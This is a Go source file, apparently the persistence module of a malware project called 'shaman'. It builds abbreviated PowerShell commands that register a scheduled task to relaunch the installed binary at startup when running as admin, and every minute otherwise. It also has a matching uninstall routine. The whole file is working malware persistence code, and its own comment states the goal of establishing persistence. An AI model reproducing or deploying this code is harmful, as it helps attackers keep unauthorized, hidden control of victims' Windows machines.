package install

import (
	"fmt"

	"github.com/whiterabb17/shaman/package/util"
)

const (
	addTaskCmd1 = "$p='%s/';$a=New-ScheduledTaskAction -E ($p+(gci -Pa $p -File -Fo)[0].Name);"
	minTrigger  = "$t=New-ScheduledTaskTrigger -RepetitionI (New-TimeSpan -M 1) -O -At (Date);"
	maxTrigger  = "$t=New-ScheduledTaskTrigger -AtStartup;"
	addTaskCmd2 = "Register-ScheduledTask -Ac $a -Tr $t -TaskN '%s' -D '%s'"
	remTaskCmd  = "Unregister-ScheduledTask -TaskN '%s' -Co:$false"
)

// TryTaskInstall attempts to establish persistence by creating a scheduled task.
func TryTaskInstall() error {
	pscmd := fmt.Sprintf(addTaskCmd1, Info.Base)
	if util.RunningAsAdmin() {
		pscmd += maxTrigger
	} else {
		pscmd += minTrigger
	}
	pscmd += fmt.Sprintf(addTaskCmd2, util.Task, util.Description)

	return util.RunPowershell(pscmd)
}

// UninstallTask removes the scheduled task entry created by the install procedure.
func UninstallTask() error {
	cmd := fmt.Sprintf(remTaskCmd, util.Task)
	return util.RunPowershell(cmd)
}
